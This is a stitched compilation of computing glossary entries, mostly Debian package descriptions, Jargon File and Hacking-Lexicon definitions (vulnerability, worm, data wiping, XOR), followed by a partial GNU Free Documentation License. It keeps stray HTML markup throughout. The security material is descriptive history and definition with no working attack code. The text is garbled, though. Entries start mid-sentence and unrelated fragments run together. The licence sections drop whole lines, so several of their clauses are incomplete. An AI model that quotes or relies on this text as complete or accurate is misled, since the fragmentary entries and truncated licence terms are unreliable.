Without "domain" it goes to "localhost". More complex capabilities are:  * recursively expanding forward files or mailing lists,  * detecting mail forwarding loops,  * understanding full-blown RFC822 address specifications,  * syntax checking that can be carried out either locally or remotely,  * various options provided to exploit alternative protocol suites    if necessary, and to print many forms of verbose output. Obvious limitations exist (mostly due to a lousy VRFY command implementation on some hosts), but otherwise, it works pretty well. From Debian 3.0r0 APT

>&#13;vulnerability (vulnerable)
</B
></DT
><DD
><P
>&#13;In the security community, the word "vulnerability" describes a problem (such as a programming bug or common misconfiguration) that allows a system to be attacked or broken into. Culture: Finding vulnerabilities is a big part of the hacker/infosec culture. Finding vulnerabilities is way of proving that you are "elite". This subculture is similar to the scientific community. For example, there are a number of people (usually commercial companies) that are "research whores": they take existing research and add their own small contribution, but then publish the result in such a way that leads people to believe that they are responsible for all the research leading up to that discovery. Contrast: The words exploit and vulnerability are tightly bound together. Often, an script/program will exploit a specific vulnerability. Since most vulnerabilities are exploited by script kiddies, the vulnerability is often known by the name of the most popular script that exploits it. Key point: There exist broad-spectrum vulnerability scanners/assessment-tools that will scan a system looking for common vulnerabilities. These are often used in order to harden a system.

>&#13;/wiz'ee-ayg/ adj. Describes a user interface under which "What You See Is All You Get"; an unhappy variant of WYSIWYG. Visual, `point-and-shoot'-style interfaces tend to have easy initial learning curves, but also to lack depth; they often frustrate advanced users who would be better served by a command-style interface. When this happens, the frustrated user has a WYSIAYG problem. This term is most often used of editors, word processors, and document formatting programs. WYSIWYG `desktop publishing' programs, for example, are a clear win for creating small documents with lots of fonts and graphics in them, especially things like newsletters and presentation slides. When typesetting book-length manuscripts, on the other hand, scale changes the nature of the task; one quickly runs into WYSIAYG limitations, and the increased power and flexibility of a command-driven formatter like TeX or Unix's troff becomes not just desirable but a necessity.

True WYSIWYG in environments supporting multiple fonts or graphics is a a rarely-attained ideal; there are variants of this term to express real-world manifestations including WYSIAWYG (What You See Is Almost What You Get) and WYSIMOLWYG (What You See Is More or Less What You Get). All these can be mildly derogatory, as they are often used to refer to dumbed-down user-friendly interfaces targeted at non-programmers; a hacker has no fear of obscure commands (compare WYSIAYG). On the other hand, EMACS was one of the very first WYSIWYG editors, replacing (actually, at first overlaying) the extremely obscure, command-based TECO. See also WIMP environment.

(The idea was that the paper for such listings was essentially good only for wallpaper, as evidenced at Stanford, where it was used to cover windows.) Now rare, esp. since other systems have developed other terms for it (e.g., PHOTO on TWENEX). However, the Unix world doesn't have an equivalent term, so perhaps wallpaper will take hold there. The term probably originated on ITS, where the commands to begin and end transcript files were :WALBEG and :WALEND, with default file WALL PAPER (the space was a path delimiter). 2. The background pattern used on graphical workstations (this is techspeak under the `Windows' graphical user interface to MS-DOS). 3. `wallpaper file' n. The file that contains the wallpaper information before it is actually printed on paper.

The archive administrator simply creates a local directory that serves as an exact model for the off-site data. All modifications and direct interaction is done locally to this directory structure. When the administrator wishes to coordinate the data on the remote site with that of the local model directory, simply executing weex accomplishes this in the most bandwidth-efficient fashion by only transferring files that need updating.

>&#13;retrieves files from the web Wget is a network utility to retrieve files from the Web using http and ftp, the two most widely used Internet protocols. It works non-interactively, so it will work in the background, after having logged off. The program supports recursive retrieval of web-authoring pages as well as ftp sites -- you can use wget to make mirrors of archives and home pages or to travel the Web like a WWW robot. Wget works particularly well with slow or unstable connections by continuing to retrieve a document until the document is fully downloaded. Re-getting files from where it left off works on servers (both http and ftp) that support it. Both http and ftp retrievals can be time stamped, so wget can see if the remote file has changed since the last retrieval and automatically retrieve the new version if it has. Wget supports proxy servers; this can lighten the network load, speed up retrieval, and provide access behind firewalls. http://www.gnu.org/software/wget/ From Debian 3.0r0 APT

ACM, Vol. 11, no. 6, June 1968)] Term used to refer to a well-known effect whereby function in a computing system family is migrated out to special-purpose peripheral hardware for speed, then the peripheral evolves toward more computing power as it does its job, then somebody notices that it is inefficient to support two asymmetrical processors in the architecture and folds the function back into the main CPU, at which point the cycle begins again. Several iterations of this cycle have been observed in graphics-processor design, and at least one or two in communications and floating-point processors.

>&#13;Erased data can frequently be retrieved through forensics on the magnetic material of a hard-disk drive or backup tape. So-called "magnetoresistive microscopes" have been developed that painstakingly scour magnetic media, and are able to reconstruct the magnetic image of a disk surface. This will show the faint residue of overwritten data. A common security measure is to "wipe" all traces of the data from a machine. Wiping usually involves: Clearing caches and logfiles. Example include browser caches, cookie files, history logs, and recently used document lists. Note that passwords are often stored in cookies and history URLs. Hard-disks "erase" files by simply removing their entries from the directory. The files still exist on the hard-disk. The first step of wiping is to actually erase them by overwriting that area of the disk. Overwriting erased areas of the hard-disk at least 7-times with different bytes (DoD spec) in order to remove all magnetic traces. Forensics specialists can usually read data from a disk that has been overwritten only once. Wiping the pagefile. Most programs do this by repeated allocating all possible memory in the system then freeing it, multiple times. Contrast: Wiping data from the disk is the electronic equivalent of shredding. It is not as strong as degaussing the disk. Misconception: Many crypto programs also contain a feature for wiping free-space. However, deleted files may be overwritten by some other file between wiping passes. This deleted file won't be wiped, and may be recoverable. Key point: In a court case in 2001, the FBI was able to successful retrieve overwritten files from a defendant's hard-drive. History: Microsoft's Windows XP, shipped in October of 2001, contains an automatic wipe feature for permanently deleting files. This has made some forensics investigators worried that they will no longer be able to successfully retrieve deleted files from dumb-criminal's machines. From Hacking-Lexicon

>&#13;Secure and efficient http server with advanced features. WN is a server for the Hypertext Transfer Protocol (HTTP/1.1).  Its primary design goals are security and functionality usually available only with complex CGI scripts without the necessity of writing or using these scripts.  This includes extensive security checks, full text searching and conditionally served text. Despite this extensive functionality the WN executable is substantially smaller than the CERN or NCSA servers.  Both a stand-alone daemon and a version intended for use under inetd are provided.  The inetd version is designed to minimize the use of system resources and it is appropriate for moderate or lightly loaded servers which cannot be totally dedicated to Web serving. WN's security model is based on the use of a small flat database in each directory with information about the files in that directory.  Fields associated with a file include its title, and may include keywords, expiration date and any user defined fields like author or document id.  Unlike other servers, the default action for WN is to deny access to a file.  A file can only be served if explicit permission to do so has been granted by entering it in this database.

A procedure to be employed by the user in order to do what some currently non-working feature should do.

>&#13;Keep Track of Time worked on Projects From the author: Worklog is a program that helps you keep track of your time.  I wrote this program because I have several projects that require me to keep a timesheet.  I sometimes spend 5 minutes here and there doing miscellaneous administrative tasks.  Rather than invoke an editor on a timesheet file for every little segment of my time spent doing these tasks, I wanted to leave a clock running and indicate with one or two keystrokes the onset or change of any given task.  Worklog is a simple ncurses based program to do just that. From Debian 3.0r0 APT

>&#13;worm
</B

><DD
><P
>&#13;A program that propagates itself by attacking other machines and copying itself to them. Example: In the late 1980s, the Morris Worm shutdown the Internet for a couple of days. At the time, well-known bugs in the UNIX sendmail program could allow a hacker to break into machines. Robert T. Morris wrote a program that would san machines for these security holes, then break into the machine. After breaking in, the program would copy itself up to that machine, then launch it. In this manner, the worm spread from machine to machine, multiplying until it had broken into nearly every machine which contained these bugs. However, the worm itself had a bug where it couldn't detect that a machine had already been broken into. Therefore, it would repeatedly break into the same machine over and over, until it machine collapsed from running too many instances of the worm. Copycats of the Morris Worm pop up repeatedly as new security holes appear in popular systems (like Linux), but they never have the devastating effect of the Morris Worm. Example: In the late 1999, the Melissa Worm/Virus nearly disabled the Internet. The worm spread by e-mailing itself to the first 50 people in a user's e-mail address book. Victims would then receive an e-mail from somebody they knew and trusted, so they would open the attached document and run the macros. In this manner, Melissa spread from inbox to inbox. Melissa is sort of a cross between a virus and a worm: it had the ability to spread itself like a worm, but it still required user interaction. Example: Around 1998, the ADMworm traveled by exploiting a few well-known Linux vulnerabilities in Linux machines, breaking into the machine, installing itself, then hunting for more machines.  Example: Having failed to learn their lesson in 1999, the industry was pummeled by the ILOVEYOU worm in early 2000. It spread in much the same way, though this time it was a VBS script rather than an .exe. Contrast: There really is not difference between a worm and a virus. The dividing line is usually drawn along the amount of human interaction involved, and how it spreads from machine to machine. A worm spreads itself with zero human interaction, whereas a virus is spread by human contact: humans exchange files from machine to machine, and when a human runs the infected program, the virus only infects other files on the same machine. Some viruses do attack servers, but only because the user is connected to the server. The Melissa Virus/Worm crosses the line: it spreads from one machine to another like a worm, but it must be launched by the user like a virus. Example: The SirCam Worm of July 2001 didn't explode as fast as other viruses, but had a large effect on the net through its "background" operation on a machine and the technique of spidering the cached files in web-browsers looking for e-mail addresses.

>&#13;n. The obvious antonym to `read-only memory'. Out of frustration with the long and seemingly useless chain of approvals required of component specifications, during which no actual checking seemed to occur, an engineer at Signetics once created a specification for a write-only memory and included it with a bunch of other specifications to be approved. This inclusion came to the attention of Signetics management only when regular customers started calling and asking for pricing information. Signetics published a corrected edition of the data book and requested the return of the `erroneous' ones. Later, in 1972, Signetics bought a double-page spread in "Electronics" magazine's April issue and used the spec as an April Fools' Day joke. Instead of the more conventional characteristic curves, the 25120 "fully encoded, 9046 x N, Random Access, write-only-memory" data sheet included diagrams of "bit capacity vs. Temp.", "Iff vs. Vff", "Number of pins remaining vs. number of socket insertions", and "AQL vs. selling price".

For more than a decade, from the early 1970s into the mid-1980s, PARC yielded an astonishing volume of groundbreaking hardware and software innovations. The modern mice, windows, and icons style of software interface was invented there. So was the laser printer and the local-area network; and PARC's series of D machines anticipated the powerful personal computers of the 1980s by a decade. Sadly, the prophets at PARC were without honor in their own company, so much so that it became a standard joke to describe PARC as a place that specialized in developing brilliant ideas for everyone else. The stunning shortsightedness and obtusity of XEROX's top-level suits has been well anatomized in "Fumbling The Future: How XEROX Invented, Then Ignored, the First Personal Computer" by Douglas K. Smith and Robert C. Alexander (William Morrow &#38; Co., 1988, ISBN 0-688-09511-9). From Jargon Dictionary

>&#13;If you want to install the X Window System (TM) on your machine, you'll need to install XFree86.The X Window System provides the base technology for developing graphical user interfaces. Simply stated,X draws the elements of the GUI on the user's screen andbuilds methods for sending user interactions back to the application. X also supports remote application deployment--running an application on another computer while viewing the input/outputon your machine.  X is a powerful environment which supports many different applications, such as games, programming tools, graphics programs, text editors, etc.  XFree86 is the version of X which runs on Linux, as well as other platforms. This package contains the basic fonts, programs and documentationfor an X workstation.  You will also need the XFree86-serverpackage, which contains the program which drives your video hardware. In addition to installing this package, you will need to install the drakxtools package to configure your card using XFdrake. You may also need to install one of the XFree86 fonts packages.And finally, if you are going to develop applications that run asX clients, you will also need to install XFree86-devel.

>&#13;XML is an HTML-like formatting language. Misconception: The recommended advice when developing Internet protocols has been be conservative in what you send and liberal in what you receive. While in the early days this philosophy fostered interoperability, any economist could tell you the long term effect of this. It leads to a large number of slightly incompatible implementations of protocols, all of which mostly work, but none of which interopate well. For example, FTP is one of the oldest Internet protocols, and there are essentially no fully complient clients or servers, and building a fully interopable client/server is extremely difficult, requiring knowledge of all the quirks of all the popular implementations. Therefore, XML has chosen the opposite approach: compliant implementations are supposed to reject all input that isn't "well-formed", even when the intent is clear. This not only avoids interoperability errors in the long run, it also dramatically improves security by guaranteeing that there is only one way to interpret things. From Hacking-Lexicon

It's also commonly used to provide control over computers and other devices that might need to be powered up or down via a timed command or remote control. The CP-290 controller stores 128 clock-driven events that it will execute when your computer is turned off, so you can even program your computer to turn itself on at a particular time. You can buy the modules and manual controllers in Radio Shack stores, but the CP-290 serial-interface controller used to command them using your Debian system is slightly harder to find.

The pointer can be warped between displays, or, depending on how you start x2x, can slide from one display to the other when it runs off the edge of the screen.  Keyboard focus also moves between displays in the way you'd expect, and the X selection propagates around.  At least one of the displays involved (specifically, the one being controlled remotely) must support the XTEST extension. (The servers shipped by Debian support this.) x2x is useful when you have two displays on the same desk, as you can use a single keyboard and mouse to control both.  If you want to propagate your selections between displays which are not sharing a desk, you might be more interested in the package propsel.  Propsel does not link the displays' keyboard and mouse, which would be confusing in some cases, and can propagate between up to 8 displays, whereas x2x can handle only two at a time.

Opponents play from separate displays, with commands being executed concurrently -- the players do not take "turns", but rather they all issue their commands simultaneously.  There can be any number of players, with each player assigned to a specific team, indicated by marker colors.  The game board is a matrix of cells (square, hexes, etc.) that can be occupied by colored troops, with the goal of the game being to eliminate the enemy from the board by attacking cells occupied by enemy troops.

This version has also been compiled to use features from gtk and gnome. Mule is the extension to (x)emacs that allows for the display of non-European characters (for example Japanese and Korean characters). This version of the package is mainly useful for only the display and reading of international characters.  It does not have any mechanism for entering non-European characters (see the xemacs21-mule-canna-wnn package for that). This package actually contains one of the six xemacs binaries available.  They are xemacs21-nomule, xemacs21-mule, xemacs21-mule-canna-wnn, xemacs21-gnome-nomule, xemacs21-gnome-mule, and xemacs21-gnome-mule-canna-wnn. From Debian 3.0r0 APT

Some of XFaces features: - Both mono and color images. - Optional Shaped window support with both xpm and xbm. - Sound support using the NetAudio protocol. The NetAudio server currently supports Sun's SparcStation (SunOS 4.1.X and Solaris 2.2), SGI's Indigo and NCD MCX X terminals running NCDware 3.1 or later. - Face images can be "compressed" so that each image will only show up once on your display. This way, if you receive 30 messages from one user, list or whatever the image will only show up once. - You can use regular expressions to search any headers to choose images and sounds or ignore that mail message completely. This lets you specify an image/sound for mail that comes from a mailing list or ignore mail that you have already seen but left in your system mailbox. - Compatibility support for Rich Burridge's faces program. This includes the ability to run user command to generate the image list. - Support for POP mailboxes. - XFaces can kick off shell commands based upon mailbox contents.  You could have yourself paged when a high priority item needs your attention. - XFaces can run external filters to convert images into Xpm so that image formats that XFaces does not understand can be used. - The annotations for mail items include username, hostname, count, user@host, the contents of any header.

It also allows you to access different groups of applications and files.

The counterpart to the above configuration is a machine with the X libraries (the xlibs package), xbase-clients, a window manager, some X font packages, and likely many more client packages. Those who desire a standalone X workstation (and/or are fuzzy on the concepts of X servers and X clients) will require both of the above sets of packages. For convenience, the "x-window-system" metapackage will include everything that is required for a standalone X workstation. A number of terms are used to refer to the X Window System, including "X", "X Version 11", "X11", "X11R6", and "X11R6.4".  The version of X used in Debian is derived from the version released by the XFree86 Project, Inc., and is thus often also referred to as "XFree86".

It uses XFS-specific directives for optimizing the dump of an XFS filesystem, and also knows how to backup XFS extended attributes.  Backups created with xfsdump are "endian safe" and can thus be transfered between Linux machines of different architectures and also between IRIX machines. xfsrestore performs the inverse function of xfsdump; it can restore a full backup of a filesystem.

The X libraries communicate with X servers by means of the X protocol.

Several more libraries are provided to implement the functions of various X extensions. X clients compiled against libc5 require that the X libraries be compiled against libc5 as well.  xlib6 provides such backward compatibility.

>&#13;X Window System client libraries The X libraries are an interface between X client programs and the hardware-oriented X servers, and consist of routines to read input from the keyboard and pointer, draw on the screen, etc., in an abstract manner that is independent of the particular characteristics of the hardware.  The X libraries, and the programs that use them, communicate with X servers by means of the X protocol. libX11 (a.k.a. Xlib) provides the low-level functionality, dealing mostly with the wire protocol and in terms of basic operations such as opening and closing the X protocol connection, creating graphics contexts, drawing graphics primitives such as lines, arcs, and glyphs, handling events, and so forth. libXpm, the X pixmap library, is a set of routines used to store and retrieve X pixmaps (a data structure comprising a rectangular array of pixels) from files; the xpm file format is an extension of the monochrome bitmap file format in the X11 specification.  (Traditionally, libXpm was maintained and distributed separately from the X Window System, but XFree86 has absorbed this library). libXt, the X Toolkit Intrinsics, is an abstract widget library upon which graphical widget libraries (such as Athena and LessTif) may be developed; the Intrinsics provide a number of useful interfaces to X conventions and protocols, in many cases reducing a long series of Xlib calls to just a couple of Xt calls. libXmu is a set of miscellaneous utility functions useful to client programmers. libXmuu is a very small set of miscellaneous utility functions extracted from Xmu, Xt, and Xaw, for clients that need the occasional useful function from these libraries but do not require the toolkit overhead.  To use libXmuu, simply include the headers for the other libraries in the client and link against Xmuu instead of Xmu, Xt, and Xaw.  Needless to say, if the client uses functions from Xmu, Xt, or Xaw that are not present in Xmuu, it will fail to link. The remainder of the libraries in this package implement the client side of various X protocol extensions:  - libICE, the Inter-Client Exchange extension;  - libPEX5, PEX, a 3D graphics extension now superseded by Mesa/OpenGL;  - libSM, the Session Management extension;  - libXIE, the X Image Extension;  - libXext, a collection of several commonly-used extensions;  - libXft, a FreeType-based font rendering extension;  - libXi, the X Input extension;  - libXp, the X Printing extension; and  - libXrender, an extension for digital image composition;  - libXtst, the X Testing extension. xlibs also contains the XKB keyboard parameter files, locale data, and a set of bitmap and pixmap image files commonly used by X clients.

Each row is presented as a "card" consisting of multiple columns, or "fields", that allow data entry. The presentation of the data is programmable; a user interface builder that allows the user to arrange fields on a card graphically is part of grok. Grok also supports a simple language that allows sophisticated queries and data retrieval. Grok comes with the above examples and a few others as pre-built applications. Grok is not a general-purpose database program. It was designed for small applications typical for desktop accessories.

>&#13;In computer science, an XOR is a mathematical operation that combines two bits. The resulting value is TRUE if either of the two bits is TRUE, but false if both are equal. In cryptography, one generally talks about doing an XOR combining two strings of bits: plaintext  11100101 01110101key         00001111 00001111            ------------------ciphertext 11101010 01111010XOR has the interesting property that XORing by the same pattern twice results in the original pattern: ciphertext 11101010 01111010key         00001111 00001111            ------------------plaintext  11100101 01110101Therefore, you can think of XOR as an extremely weak encryption algorithm. The above example shows using XOR as a way of encrypting the original data with the 8-bit key of "00001111". Many products use this technique to obfuscate data. However, it is extremely easy to recover the original key via a known plaintext attack, as show below: ciphertext 11101010 01111010plaintext  11100101 01110101           ------------------key         00001111 00001111Key point: XOR is a common mathematical operation used in cryptographic algorithms. In fact, the only 100% secure form of encryption is XORing against a one-time pad. Also, any hash algorithm can be converted into an encryption algorithm though a clever use of XOR.

>&#13;Music player for tunes from C64 and Amiga This is a very sophisticated music player for C64 and Amiga tunes, aka SID tunes. It's very simple now to change emulation parameters and control tunes and subtunes. Furthermore, the player features a playlist and support for the HVSC song lengths database file. The `README' contains instructions where to download and how to install this file. There is a somewhat `hidden' expert mode, which enables the built-in oscilloscope. Please see `README.Debian' and `README' for more information (and possible problems). From Debian 3.0r0 APT

>&#13;A program for managing a WWW site via FTP, DAV or HTTP(GNOME version) sitecopy is for copying locally stored websites to remote ftp servers. With a single command, the program will synchronize a set of local files to a remote server by performing uploads and remote deletes as required. The aim is to remove the hassle of uploading and deleting individual files using an FTP client.  sitecopy will also optionally try to spot files you move locally, and move them remotely. sitecopy is designed to not care about what is actually on the remote server - it simply keeps a record of what it THINKS is in on the remote server, and works from that. This version is the GNOME frontend to sitecopy. From Debian 3.0r0 APT

When the user executes xsu, he/she will be prompted for a command, a username and a password. If the username and password are correct xsu will execute the command as the entered user. So if the username was root, then the command will be executed as root. Of course it's also possible to predefine the username and the command by using the [-u,--username] and [-c,--command] arguments at the command line of xsu. This can be very useful when using xsu in for example gmenu or the GNOME panel. * Security Gnome Xsu 2.0 uses the standard su binary to gain it's root access. This way, all security issues should be solved. The security of all older xsu versions was very bad. With xsu version 0.1.0 the use of a pipe to a secured non-Gnome SUID application was introduced. This has been replaced with a special type of pipe to the standard GNU su application from the 'login' package. From Debian 3.0r0 APT

This is accomplished with three separate programs: the interactive interface (xtide), the non-interactive or command line interface (tide), and the web interface (xttpd). The algorithm that XTide uses to predict tides is the one used by the National Ocean Service in the U.S. It is significantly more accurate than the simple tide clocks that can be bought in novelty stores. However, it takes more to predict tides accurately than just a spiffy algorithm -- you also need data for every location for which you want to predict tides. This package provide a sample data set for only one location so you can try out the package, but anything useful requires the data packaged in the xtide-data package (or downloaded from the XTide ftp site).

It features cassette, floppy, and hard drive emulation, timer interrupt emulation, file import and export from the host operating system, support for most of the undocumented Z-80 instructions, and a built-in debugger.  Real floppy drives can be used, and, if an OSS-compatible sound driver is available, application-based sound can be played and real cassettes read and written directly through the sound card or via WAVE files.  Several hi-res graphics cards are emulated and, in Model 4/4P mode, mice are supported. There is also real-time clock, sound card, serial port, joystick, and CPU clock speedup emulation. xtrs requires ROM images from the original machines.  The ROMs are copyrighted by Radio Shack and are not freely licensed.  (Exception: in Model 4P mode, a freely licensed boot ROM included with this package can be used to boot a Model 4 operating system from a diskette image.)

It is, in essence, a remote display system which allows you to view a computing `desktop' environment not only on the machine where it is running, but from anywhere on the Internet and from a wide variety of machine architectures. It is implemented in a client/server model. This package provides a client for X, with this you can connect to a vncserver somewhere in the network and display its content in a window. There are vncserver available for X and for Win95/NT. This package is an enhanced version of VNC including TightVNC allowing it to be optimized to work over slow network connections such as low-speed modem links so you can work remotely almost in real time in most environments.

>&#13;X terminal-emulator similar to xterm, but smaller xvt is an X terminal-emulator that is designed to be more or less compatible with xterm while using much less swap space.  It is mainly intended for use at sites which use large numbers of X terminals but may also be useful on single workstations that are short of memory. The main way that xvt achieves its small size is by avoiding the use of the X toolkit. If you are looking for a more featureful terminal-emulator than xvt, but one which still uses less swap space than xterm, consider rxvt. Features of xterm which xvt does not support include:  - Tektronix 4014 emulation  - Session logging  - Pop-up menus.  The only one of xterm's popup menu commands that    is provided in xvt is displaying and hiding of the scrollbar    and this is done simply by pressing any mouse key in the window    with the CONTROL key held down.  - Toolkit style configurability.  In particular, xvt does not    allow the user to remap the mouse or keyboard keys. Features which are supported include:  - VT100 emulation.  Most of the main escape sequences are supported --    certainly all those used by the standard screen based UNIX    applications.  - Lines that scroll off the top of the window are saved and can be    scrolled back with a scrollbar.  - Text selection and insertion including double and triple click for    words and lines.

For more on how xzgv works and how to use it, do `info xzgv' or `man xzgv' once it's installed. xzgv differs from other picture viewers for X in that it uses one window for both the file selector and viewer, it (unlike xv) allows both scrolling and fit-to-window methods of viewing large pictures, and it (unlike xv and some others) doesn't ever mangle the picture's aspect ratio. It also provides extensive keyboard support; if you prefer using the keyboard, this is almost certainly the best viewer for you. But it doesn't skimp on the mousey stuff, either.

>F.1. PREAMBLE</H1
><P
>The purpose of this License is to make a manual, textbook, or
other functional and useful document "free" in the sense of freedom: to
assure everyone the effective freedom to copy and redistribute it, with
or without modifying it, either commercially or noncommercially.
Secondarily, this License preserves for the author and publisher a way
to get credit for their work, while not being considered responsible for
modifications made by others.</P
><P
>This License is a kind of "copyleft", which means that derivative
works of the document must themselves be free in the same sense.  It
complements the GNU General Public License, which is a copyleft license
designed for free software.</P
><P
>We have designed this License in order to use it for manuals for
free software, because free software needs free documentation: a free
program should come with manuals providing the same freedoms that the
software does.  But this License is not limited to software manuals; it
can be used for any textual work, regardless of subject matter or
whether it is published as a printed book.  We recommend this License
principally for works whose purpose is instruction or reference.</P
></DIV
><DIV
CLASS="section"
><HR><H1
CLASS="section"
><A
NAME="gfdl-1"
></A
>F.2. APPLICABILITY AND DEFINITIONS</H1
><P
>This License applies to any manual or other work, in
any medium, that contains a notice placed by the copyright holder saying
it can be distributed under the terms of this License.  Such a notice
grants a world-wide, royalty-free license, unlimited in duration, to use
that work under the conditions stated herein.  The "Document", below,
refers to any such manual or work.  Any member of the public is a
licensee, and is addressed as "you".  You accept the license if you
copy, modify or distribute the work in a way requiring permission under
copyright law.</P
><P
>A "Modified Version" of the Document means any
work containing the Document or a portion of it, either copied verbatim,
or with modifications and/or translated into another language.</P
><P
>A "Secondary Section" is a named appendix or
a front-matter section of the Document that deals exclusively with the
relationship of the publishers or authors of the Document to the
Document's overall subject (or to related matters) and contains nothing
that could fall directly within that overall subject.  (Thus, if the
Document is in part a textbook of mathematics, a Secondary Section may
not explain any mathematics.)  The relationship could be a matter of
historical connection with the subject or with related matters, or of
legal, commercial, philosophical, ethical or political position
regarding them.</P
><P
>The "Invariant Sections" are certain Secondary
Sections whose titles are designated, as being those of Invariant
Sections, in the notice that says that the Document is released under
this License.  If a section does not fit the above definition of
Secondary then it is not allowed to be designated as Invariant.  The
Document may contain zero Invariant Sections.  If the Document does not
identify any Invariant Sections then there are none.</P
><P
>The "Cover Texts" are certain short passages of
text that are listed, as Front-Cover Texts or Back-Cover Texts, in the
notice that says that the Document is released under this License.  A
Front-Cover Text may be at most 5 words, and a Back-Cover Text may be at
most 25 words.</P
><P
>A "Transparent" copy of the Document means a
machine-readable copy, represented in a format whose specification is
available to the general public, that is suitable for revising the
document straightforwardly with generic text editors or (for images
composed of pixels) generic paint programs or (for drawings) some widely
available drawing editor, and that is suitable for input to text
formatters or for automatic translation to a variety of formats suitable
for input to text formatters.  A copy made in an otherwise Transparent
file format whose markup, or absence of markup, has been arranged to
thwart or discourage subsequent modification by readers is not
Transparent.  An image format is not Transparent if used for any
substantial amount of text.  A copy that is not "Transparent" is called
"Opaque".</P
><P
>Examples of suitable formats for Transparent copies include plain
ASCII without markup, Texinfo input format, LaTeX input format, SGML or
XML using a publicly available DTD, and standard-conforming simple HTML,
PostScript or PDF designed for human modification.  Examples of
transparent image formats include PNG, XCF and JPG.  Opaque formats
include proprietary formats that can be read and edited only by
proprietary word processors, SGML or XML for which the DTD and/or
processing tools are not generally available, and the machine-generated
HTML, PostScript or PDF produced by some word processors for output
purposes only.</P
><P
>The "Title Page" means, for a printed book,
the title page itself, plus such following pages as are needed to hold,
legibly, the material this License requires to appear in the title page.
For works in formats which do not have any title page as such, "Title
Page" means the text near the most prominent appearance of the work's
title, preceding the beginning of the body of the text.</P
><P
>A section "Entitled XYZ" means a named subunit
of the Document whose title either is precisely XYZ or contains XYZ in
parentheses following text that translates XYZ in another language.
(Here XYZ stands for a specific section name mentioned below, such as
"Acknowledgements", "Dedications", "Endorsements", or "History".)  To
"Preserve the Title" of such a section when you modify the Document
means that it remains a section "Entitled XYZ" according to this
definition.</P
><P
>The Document may include Warranty Disclaimers next to the notice
which states that this License applies to the Document.  These Warranty
Disclaimers are considered to be included by reference in this License,
but only as regards disclaiming warranties: any other implication that
these Warranty Disclaimers may have is void and has no effect on the
meaning of this License.</P

>F.3. VERBATIM COPYING</H1
><P
>You may copy and distribute the Document in any medium, either
commercially or noncommercially, provided that this License, the
copyright notices, and the license notice saying this License applies to
the Document are reproduced in all copies, and that you add no other
conditions whatsoever to those of this License.  You may not use
technical measures to obstruct or control the reading or further copying
of the copies you make or distribute.  However, you may accept
compensation in exchange for copies.  If you distribute a large enough
number of copies you must also follow the conditions in section 3.
</P
><P
>You may also lend copies, under the same conditions stated above,
and you may publicly display copies.</P
></DIV
><DIV
CLASS="section"
><HR><H1
CLASS="section"
><A
NAME="gfdl-3"
></A
>F.4. COPYING IN QUANTITY</H1
><P
>If you publish printed copies (or copies in media that commonly
have printed covers) of the Document, numbering more than 100, and the
Document's license notice requires Cover Texts, you must enclose the
copies in covers that carry, clearly and legibly, all these Cover Texts:
Front-Cover Texts on the front cover, and Back-Cover Texts on the back
cover.  Both covers must also clearly and legibly identify you as the
publisher of these copies.  The front cover must present the full title
with all words of the title equally prominent and visible.  You may add
other material on the covers in addition.  Copying with changes limited
to the covers, as long as they preserve the title of the Document and
satisfy these conditions, can be treated as verbatim copying in other
respects.</P
><P
>If the required texts for either cover are too voluminous to fit
legibly, you should put the first ones listed (as many as fit
reasonably) on the actual cover, and continue the rest onto adjacent
pages.</P
><P
>If you publish or distribute Opaque copies of the Document
numbering more than 100, you must either include a machine-readable
Transparent copy along with each Opaque copy, or state in or with each
Opaque copy a computer-network location from which the general
network-using public has access to download using public-standard
network protocols a complete Transparent copy of the Document, free of
added material.  If you use the latter option, you must take reasonably
prudent steps, when you begin distribution of Opaque copies in quantity,
to ensure that this Transparent copy will remain thus accessible at the
stated location until at least one year after the last time you
distribute an Opaque copy (directly or through your agents or retailers)
of that edition to the public.</P
><P
>It is requested, but not required, that you contact the authors of
the Document well before redistributing any large number of copies, to
give them a chance to provide you with an updated version of the
Document.</P

><P
>You may copy and distribute a Modified Version of the Document
under the conditions of sections 2 and 3 above, provided that you
release the Modified Version under precisely this License, with the
Modified Version filling the role of the Document, thus licensing
distribution and modification of the Modified Version to whoever
possesses a copy of it.  In addition, you must do these things in the
Modified Version:</P

  title distinct from that of the Document, and from those of previous

  section of the Document).  You may use the same title as a previous
  version if the original publisher of that version gives permission.
</P
></LI
><LI
><P
>List on the Title Page, as authors, one or more
  persons or entities responsible for authorship of the modifications in
  the Modified Version, together with at least five of the principal
  authors of the Document (all of its principal authors, if it has fewer
  than five), unless they release you from this requirement.

  Page.  If there is no section Entitled "History" in the Document,
  create one stating the title, year, authors, and publisher of the
  Document as given on its Title Page, then add an item describing the
  Modified Version as stated in the previous sentence.

  Document for public access to a Transparent copy of the Document, and
  likewise the network locations given in the Document for previous
  versions it was based on.  These may be placed in the "History"
  section.  You may omit a network location for a work that was
  published at least four years before the Document itself, or if the
  original publisher of the version it refers to gives permission.

  "Dedications", Preserve the Title of the section, and preserve in the
  section all the substance and tone of each of the contributor
  acknowledgements and/or dedications given therein.

  "Endorsements" or to conflict in title with any Invariant Section.

>If the Modified Version includes new front-matter sections or
appendices that qualify as Secondary Sections and contain no material
copied from the Document, you may at your option designate some or all
of these sections as invariant.  To do this, add their titles to the
list of Invariant Sections in the Modified Version's license notice.
These titles must be distinct from any other section titles.</P
><P
>You may add a section Entitled "Endorsements", provided it
contains nothing but endorsements of your Modified Version by various
parties--for example, statements of peer review or that the text has
been approved by an organization as the authoritative definition of a
standard.</P
><P
>You may add a passage of up to five words as a Front-Cover Text,
and a passage of up to 25 words as a Back-Cover Text, to the end of the
list of Cover Texts in the Modified Version.  Only one passage of
Front-Cover Text and one of Back-Cover Text may be added by (or through
arrangements made by) any one entity.  If the Document already includes
a cover text for the same cover, previously added by you or by
arrangement made by the same entity you are acting on behalf of, you may
not add another; but you may replace the old one, on explicit permission
from the previous publisher that added the old one.</P

>The combined work need only contain one copy of this License, and
multiple identical Invariant Sections may be replaced with a single
copy.  If there are multiple Invariant Sections with the same name but
different contents, make the title of each such section unique by adding
at the end of it, in parentheses, the name of the original author or
publisher of that section if known, or else a unique number.  Make the
same adjustment to the section titles in the list of Invariant Sections
in the license notice of the combined work.</P

"History" in the various original documents, forming one section
Entitled "History"; likewise combine any sections Entitled
"Acknowledgements", and any sections Entitled "Dedications".  You must

documents released under this License, and replace the individual copies
of this License in the various documents with a single copy that is
included in the collection, provided that you follow the rules of this
License for verbatim copying of each of the documents in all other
respects.</P

>F.8. AGGREGATION WITH INDEPENDENT WORKS</H1
><P
>A compilation of the Document or its derivatives with other
separate and independent documents or works, in or on a volume of a
